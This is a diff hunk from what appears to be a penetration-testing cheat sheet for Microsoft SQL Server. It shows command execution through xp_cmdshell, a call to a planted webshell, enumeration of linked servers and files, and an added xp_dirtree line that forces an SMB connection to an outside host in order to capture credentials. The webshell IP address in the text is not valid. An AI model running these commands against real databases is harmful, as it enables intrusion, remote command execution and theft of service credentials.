@@ -1150,8 +1150,9 @@ EXECUTE xp_cmdshell 'whoami';
 http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 
 SELECT * FROM fn_my_permissions(NULL, 'SERVER');
-EXEC sp_linkedservers;
-EXEC xp_dirtree 'C:\inetpub\wwwroot', 10, 1;
+EXEC sp_linkedservers; # check for external linked servers
+EXEC xp_dirtree 'C:\inetpub\wwwroot', 10, 1; #list files
+EXEC master..xp_dirtree '\\10.10.197.141\transfer'; #get credentials by forcing an smb connection
 ```
 
 ---
